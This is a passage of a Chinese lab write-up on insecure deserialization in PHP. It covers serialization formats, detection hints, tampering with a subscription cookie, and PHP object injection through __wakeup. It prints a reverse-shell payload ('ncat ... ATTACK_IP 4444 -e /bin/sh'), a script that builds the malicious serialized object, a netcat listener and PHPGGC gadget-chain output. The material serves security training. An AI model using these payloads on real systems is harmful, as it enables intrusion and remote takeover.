+<li><strong>反序列化</strong> ：然后将二进制数据传递给 <code>pickle.loads()</code> ，后者从二进制流中重建原始 Python 对象。</li>
+</ul>
+<p>使用字符串&quot;<strong>TEST123</strong>&ldquo;进行序列化后可以得到：</p>
+<ul>
+<li><strong>Pickling</strong> ：当此字符串被 pickle 时，它​​会被转换成人类无法读取的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他元数据的信息。</li>
+<li><strong>Base64 编码</strong> ：数据的二进制形式随后被编码为 Base64 字符串，可能看起来像 <code>gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu</code> 。</li>
+</ul>
+<p>在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 使用 <code>serialize()</code> 和 <code>unserialize()</code> 函数将对象和其他数据类型转换为易于存储且易于重建的格式。同样，Python 使用 <code>Pickle</code> 模块将对象序列化为字节流，并将其反序列化回原始状态。</p>
+<p>除了这两种语言之外，序列化是各种编程环境的共同特性，每种环境都有独特的实现和库。在 <strong>Java</strong> 中，对象序列化通过 <code>Serializable</code> 接口实现，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 <strong>.NET</strong>，序列化多年来已经有了显著的发展。最初， <code>BinaryFormatter</code> 通常用于二进制序列化；但是， 由于安全问题， 现在不鼓励使用它 。现代 .NET 应用程序通常使用 <code>System.Text.Json</code> 进行 JSON 序列化，或使用 <strong>System.Xml.Serialization</strong> 进行 XML 任务，这反映了向更安全、更标准化的数据交换格式的转变。<strong>Ruby</strong> 通过其 <code>Marshal</code> 模块提供了简便性，该模块以序列化和反序列化对象而闻名，对于更易于人类阅读的格式，它通常使用 <strong>YAML</strong> 。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实现序列化以确保跨 Web 应用程序的数据完整性和安全性的重要性。</p>
+<h2 id="鉴别">鉴别
+</h2><p>在彻底了解不同编程语言的序列化之后，我们将转向网络安全的一个关键方面，即利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的具体细节之前，务必了解如何识别应用程序中的这些漏洞，无论您是否能够访问代码（白盒测试）或是不能（黑盒测试）。</p>
+<h3 id="访问源代码">访问源代码
+</h3><p>当可以访问源代码时，识别序列化漏洞会更加简单，但需要对要查找的内容有敏锐的理解。例如，通过代码审查，我们可以检查源代码中是否存在 <code>serialize()</code> 、 <code>unserialize()</code> 、 <code>pickle.loads(</code> ) 等序列化函数 。我们必须特别注意任何可能将用户提供的输入直接传递给这些函数的位置。</p>
+<h3 id="无法访问源代码">无法访问源代码
+</h3><p>在无法访问源代码的情况下审计应用程序时，挑战在于仅根据外部观察和交互推断其如何处理数据。这通常被称为<strong>黑盒测试</strong> 。在这里，我们专注于检测服务器响应和 cookie 中的模式，这些模式可能表明使用了序列化和潜在的漏洞。作为一名渗透测试人员，在 PHP 文件名末尾附加波浪号 <code>~</code> 是攻击者用来尝试访问由文本编辑器或版本控制系统创建的备份或临时文件的常用技术。当编辑或保存文件时，某些文本编辑器或版本控制系统可能会在文件名后附加波浪号，制作原始文件的备份副本。</p>
+<p><strong>分析服务器响应</strong></p>
+<ul>
+<li><strong>错误消息</strong> ：某些错误消息可以间接表明序列化存在问题。例如，PHP 可能会抛出包含 <code>**unserialize()**</code> 或 <strong>Object deserialisation error</strong> 等短语的错误或警告，这些短语会暴露底层序列化过程和潜在的漏洞。</li>
+<li><strong>应用程序行为不一致</strong> ：响应被操纵的输入（例如，修改的 Cookie 或 POST 数据）时出现的异常行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理被修改的序列化数据可以提供潜在漏洞代码的线索。</li>
+</ul>
+<p><strong>检查 Cookie</strong></p>
+<ul>
+<li><strong>Cookie 中的 Base64 编码值（ PHP 和 .NET）</strong> ：如果 Cookie 包含看似 Base64 编码的数据，对其进行解码可能会发现序列化的对象或数据结构。PHP 通常使用序列化进行会话管理，并以序列化格式存储会话变量。</li>
+<li><strong>ASP.NET 视图状态</strong> ：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 <code>__VIEWSTATE</code> 的字段，该字段采用 base64 编码。对其进行解码和检查可以揭示它是否包含可被利用的序列化数据。</li>
+</ul>
+<h2 id="漏洞利用-更新属性">漏洞利用-更新属性
+</h2><h3 id="更新对象的属性">更新对象的属性
+</h3><p>在本任务中，我们将探索一个 PHP  实例，并以一个简单的笔记共享应用程序作为案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将笔记输入到应用程序中，然后将其保存以供将来参考。此外，用户还可以与他人共享笔记，从而促进协作和信息交换。该应用程序还包含基于订阅的功能，确保只有订阅用户才能访问某些功能，例如笔记共享。您可以通过链接 <code>http://10.10.183.12/case1</code> 访问该网站。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140013116.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424140013116"
+	
+	
+></p>
+<p>让我们了解一下该应用程序是如何构建的。</p>
+<h4 id="定义-notes-类">定义 Notes 类
+</h4><p>该应用程序有一个 <code>Notes</code> 类，代表我们应用程序中的一条注释。该类有三个私有属性： <code>user</code> 、 <code>role</code> 和 <code>isSubscribed</code> 。我们还有 setter 和 getter 方法来操作 <code>isSubscribed</code> 属性。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Notes</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$isSubscribed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$role</span><span class="p">,</span> <span class="nv">$isSubscribed</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">role</span> <span class="o">=</span> <span class="nv">$role</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isSubscribed</span> <span class="o">=</span> <span class="nv">$isSubscribed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">setIsSubscribed</span><span class="p">(</span><span class="nv">$isSubscribed</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isSubscribed</span> <span class="o">=</span> <span class="nv">$isSubscribed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getIsSubscribed</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isSubscribed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="将用户数据存储在-cookie-中">将用户数据存储在 Cookie 中
+</h4><p>当用户首次访问我们的应用时，它会设置一个序列化的 Cookie，其中包含用户数据。这些数据包括用户名、角色和订阅状态（ <code>isSubscribed</code> ）。如果用户是付费会员（ <strong>isSubscribed = true</strong> ），则允许他们分享笔记。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424135959233.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424135959233"
+	
+	
+></p>
+<h4 id="利用漏洞">利用漏洞
+</h4><p>在此步骤中，我们将说明攻击者如何通过修改序列化的 cookie 值来利用此漏洞，以获得对共享笔记的未经授权的访问。</p>
+<p><strong>序列化 cookie</strong> ：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;Notes&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;user&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;guest&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">&#34;role&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;guest&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;isSubscribed&#34;</span><span class="p">;</span><span class="nx">b</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们已经知道，在 PHP 序列化过程中，如果<strong>属性名不是公开</strong>的，则<strong>类名会作为属性名的前缀</strong>，以确保唯一性并方便反序列化。这是 PHP 内部处理对象序列化和反序列化的方式之一。当一个对象被序列化时， PHP 会存储该对象的属性和类名。这确保了当对象稍后被反序列化时， PHP 知道要实例化哪个类，以及如何将序列化的数据正确地赋值给对象的属性。让我们将序列化注释分解成各个部分：</p>
+<ul>
+<li><strong>O:5:&ldquo;Notes&rdquo;:3</strong> ：这表示具有类名 Notes 的对象（O），它具有三个属性。</li>
+<li><strong>s:4:&ldquo;user&rdquo;;s:5:&ldquo;guest&rdquo;</strong> ：这表示一个长度为 4 个字符的字符串，代表值为“ <strong>guest</strong> ”的属性 <code>user</code> 。</li>
+<li><strong>s:4:&ldquo;role&rdquo;;s:5:&ldquo;guest&rdquo;</strong> ：与上一个类似，它表示值为“ <strong>guest</strong> ”的属性 <code>role</code> 。</li>
+<li><strong>s:12:&ldquo;isSubscribed&rdquo;;b:0</strong> ：这表示名为 <code>isSubscribed</code> 的布尔 (b) 属性，其值为 false (0)。</li>
+</ul>
+<h3 id="利用漏洞-1">利用漏洞
+</h3><p>在当前情况下，当用户想要尝试分享笔记时，他们会看到以下弹出窗口：</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140403414.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424140403414"
+	
+	
+></p>
+<p>那么后端发生了什么？后端 PHP 代码会验证传入的 Cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务就是绕过这一步。</p>
+<p>假设攻击者拦截了此序列化的 Cookie 值，并将其 <code>isSubscribed</code> 属性从 false (0) 修改为 true (1)。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。</p>
+<p>修改后，攻击者会再次对序列化数据进行 base64 编码，并用修改后的值替换原始 cookie 值。这将允许攻击者获得未经授权的访问权限，从而绕过预定的订阅限制，在其他平台上共享笔记。</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424140743017.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424140743017"
+	
+	
+></p>
+<h2 id="漏洞利用-对象注入">漏洞利用-对象注入
+</h2><p>对象注入是一种由 Web 应用程序中<strong>不安全的数据反序列</strong>化引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以利用该漏洞操纵序列化数据并执行任意代码，从而造成严重的安全风险。</p>
+<p>众所周知，该漏洞源于序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化），然后重建为对象（反序列化）。虽然序列化和反序列化对于数据存储和传输非常有用，但如果实施不当，也可能带来安全风险。</p>
+<p>要利用 PHP 对象注入漏洞，应用程序必须包含一个包含 PHP 魔术方法（例如 <code>__wakeup</code> 或 <code>__sleep</code> ）的类，以便攻击者利用这些方法进行恶意攻击。所有涉及攻击的类都应在调用 <code>unserialize()</code> 方法之前声明（除非支持对象自动加载）。</p>
+<p><strong>例子</strong></p>
+<p>让我们考虑一个 <code>index.php</code> 代码片段，它展示了如何使用 <code>serialize()</code> 和 <code>unserialize()</code> 函数进行序列化和反序列化。该代码接受 <strong>GET</strong> 参数的<strong>解码</strong>或<strong>编码</strong> ，并相应地转换用户提供的值。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserData</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="k">require</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;encode&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$userData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">UserData</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;encode&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$serializedData</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$userData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$base64EncodedData</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$serializedData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Normal Data: &#34;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;encode&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Serialized Data: &#34;</span> <span class="o">.</span> <span class="nv">$serializedData</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Base64 Encoded Data: &#34;</span> <span class="o">.</span> <span class="nv">$base64EncodedData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;decode&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$base64EncodedData</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;decode&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$serializedData</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$base64EncodedData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$test</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serializedData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Base64 Encoded Serialized Data: &#34;</span> <span class="o">.</span> <span class="nv">$base64EncodedData</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Serialized Data: &#34;</span> <span class="o">.</span> <span class="nv">$serializedData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如，如果我们通过 URL <a class="link" href="http://10.10.183.12/case2/?encode=hellothm"  target="_blank" rel="noopener"
+    >http ://10.10.183.12/case2/?encode=</a> hellothm 发送输入 <strong>hellothm</strong> ，我们将得到以下输出：</p>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424141228400.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424141228400"
+	
+	
+></p>
+<p>我们看到代码中包含一个名为 <code>test.php</code> 的文件。通过查看源代码或考虑该框架是否开源，渗透测试人员知道 <code>test.php</code> 包含一个名为 <code>MaliciousUserData</code> 的类，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MaliciousUserData</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s1">&#39;ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh&#39;</span><span class="p">;</span> <span class="c1">// call to troubleshooting server
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">exec</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在上述代码中，通过不安全的反序列化，攻击者可以操纵对象的属性，包括修改 <code>MaliciousUserData</code> 类的 <code>command</code> 属性。这可以通过精心设计一个包含所需属性值的序列化字符串来实现。 例如，如果我们想要修改 <code>command</code> 属性以执行其他命令或连接到其他服务器，我们可以将一个对象序列化为所需的属性值，然后将其注入到存在漏洞的 <code>unserialize()</code> 函数中。这样，在反序列化时，被操纵的属性值将被加载到对象中。</p>
+<p>需要注意的是，在不安全的反序列化过程中，您无法直接更新 <code>__wakeup</code> 方法本身的定义。__ <code>__wakeup</code> 方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以在 <code>__wakeup</code> 方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但其在反序列化时的操作可以被操纵以实现不同的结果。</p>
+<h3 id="准备payload">准备Payload
+</h3><p>如前所述，调用另一个类是 PHP 的常规功能，如果目标网站使用开源代码，您可以查看该文件的代码。<code>index.php</code> 的代码会盲目地反序列化输入，而不执行任何清理。这里有什么选择呢？如果我们修改 <code>MaliciousUserData</code> 类并修改其 <code>command</code> 属性，使得在调用 <code>__wakeup</code> 函数时，使用攻击者提供的值进行调用，结果会怎样？</p>
+<p>创建一些 PHP 代码来生成恶意序列化的用户数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">MaliciousUserData</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s1">&#39;ncat -nv ATTACK_IP 4444 -e /bin/sh&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$maliciousUserData</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MaliciousUserData</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$serializedData</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$maliciousUserData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$base64EncodedData</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$serializedData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;Base64 Encoded Serialized Data: &#34;</span> <span class="o">.</span> <span class="nv">$base64EncodedData</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>在上面的代码中， <code>MaliciousUserData</code> 类（ <code>test.php</code> ）的 <code>_wakeup()</code> 函数将使用 Ncat 执行反向 shell 命令，连接到指定的 IP 地址（ <code>ATTACK_IP</code> ）和端口（ <code>4444</code> ），并使用 -e 标志以 shell 形式执行 <code>/bin/sh</code></li>
+<li>创建文件后，通过终端执行 <code>php index.php</code> 。这将返回一个 base64 编码的 <code>MaliciousUserData</code> 类序列化对象。</li>
+<li>生成的 base64 编码字符串如下所示： <code>TzoxNzoiTWFsaWNp[Redacted]</code> 。</li>
+<li>使用 AttackBox 上的命令 <code>nc -nvlp 4444</code> 启动端口 4444 上的 Netcat 监听器。</li>
+<li>现在，是时候通过访问 URL <code>http://10.10.183.12/case2/?decode=[SHELLCODE]</code> 来解码 shellcode 来利用不安全的反序列化，而无需生成 shellcode。</li>
+<li>一旦访问该 URL，index.php 文件的反序列​​化函数就会对字符串进行反序列化并执行 <code>__wakeup()</code> 函数，从而进入远程 shell。</li>
+</ul>
+<p><img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250424142828650.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250424142828650"
+	
+	
+></p>
+<h2 id="自动化脚本">自动化脚本
+</h2><p>在渗透测试过程中，自动化脚本对于高效识别和利用 Web 应用程序中的漏洞至关重要。我们将探索一款名为 <strong>PHP Gadge Chain (PHPGGC)</strong> 的工具，它在此过程中发挥着至关重要的作用，能够自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 <strong>Ysoserial</strong>，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。</p>
+<h3 id="php-工具链-phpggc">PHP 工具链 (PHPGGC)
+</h3><p>PHPGGC 主要是一个用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。</p>
+<p><strong>功能</strong></p>
+<ul>
+<li><strong>小工具链</strong> ：PHPGGC 为各种 PHP 框架和库提供了一个小工具链库。这些小工具链是对象和方法的序列，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定的漏洞。</li>
+<li><strong>有效载荷生成</strong> ：PHPGGC 的主要目的是促进生成可触发这些漏洞的序列化有效载荷。它帮助安全研究人员和渗透测试人员创建有效载荷，以展示不安全的反序列化漏洞的影响。</li>
+<li><strong>有效载荷定制</strong> ：用户可以通过为小工具链中涉及的函数或方法指定参数来定制有效载荷，从而定制攻击以实现特定结果，例如编码。</li>
+</ul>
+<p>可以从 <a class="link" href="https://github.com/ambionics/phpggc"  target="_blank" rel="noopener"
+    >GitHub 仓库</a>下载 PHPGGC，已安装的版本已包含一些小工具链、PHP 对象序列以及旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的魔术方法来实现各种攻击目标，例如远程代码执行。</p>
+<p>要列出所有可用的小工具链，您可以使用 PHPGGC 的 <code>-l</code> 选项，它将显示发起特定攻击的名称、版本、类型和向量。此外，您还可以根据小工具链的功能进行筛选，例如针对特定 PHP 框架或实现特定漏洞利用技术的链，方法是使用 <code>-l</code> 选项后跟筛选关键字（例如 Drupal、Laravel 等）。这样您就可以根据自己的利用场景选择合适的小工具链，如下所示：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">yrc@machine$ php phpggc -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Gadget Chains
+</span></span><span class="line"><span class="cl">-------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NAME                                      VERSION                                                 TYPE                      VECTOR          I    
+</span></span><span class="line"><span class="cl">Bitrix/RCE1                               17.x.x &lt;<span class="o">=</span> 22.0.300                                      RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CakePHP/RCE1                              ? &lt;<span class="o">=</span> 3.9.6                                              RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CakePHP/RCE2                              ? &lt;<span class="o">=</span> 4.2.3                                              RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/FD1                          &lt;<span class="o">=</span> 4.3.6                                                File delete               __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/FD2                          &lt;<span class="o">=</span> 4.3.7                                                File delete               __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/FR1                          4.0.0 &lt;<span class="o">=</span> 4.3.6                                          File <span class="nb">read</span>                 __toString      *    
+</span></span><span class="line"><span class="cl">CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;<span class="o">=</span> 4.3.6                                     RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/RCE3                         4.0.4 &lt;<span class="o">=</span> 4.4.3                                          RCE: Command              __destruct           
+</span></span><span class="line"><span class="cl">CodeIgniter4/RCE4                         4.0.0-beta.1 &lt;<span class="o">=</span> 4.0.0-rc.4                              RCE: Command              __destruct        
+</span></span></code></pre></td></tr></table>
+</div>
